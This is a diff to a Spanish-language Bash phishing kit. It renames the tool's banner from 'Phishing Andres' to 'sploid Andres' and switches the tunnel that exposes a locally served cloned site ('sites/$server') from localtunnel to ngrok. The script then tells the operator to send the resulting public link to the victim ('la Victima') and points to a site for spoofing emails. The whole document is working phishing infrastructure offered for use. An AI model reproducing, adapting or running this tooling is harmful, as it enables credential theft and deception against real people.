@@ -238,7 +238,7 @@ printf "    .-----.----.----.-----.----.   |   Y   |   _   |   Y   |      \n"
 printf "    |  -__|   _|   _|  _  |   _|   |   |   |.  |   |   |   |     \n"
 printf "    |_____|__| |__| |_____|__|     |____   |.  |   |____   |     \n"
 printf "                                       |:  |:  1   |   |:  |    \n"
-printf "     \e[0m\e[1;77m Phishing Andres\e[1;31m |::.|::.. . |   |::.|    \n"
+printf "     \e[0m\e[1;77m sploid Andres\e[1;31m |::.|::.. . |   |::.|    \n"
 printf "                                        --- -------     ---     \n"
                                           
 printf "\n"
@@ -447,13 +447,13 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor PHP...\n"
-cd sites/$server && php -S 127.0.0.1:8000 > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor con localtunnel.me...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor con Ngrok...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:8000/status | grep -o "https://[0-9a-z]*\.localtunnel.me")
+link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $link
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en os siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
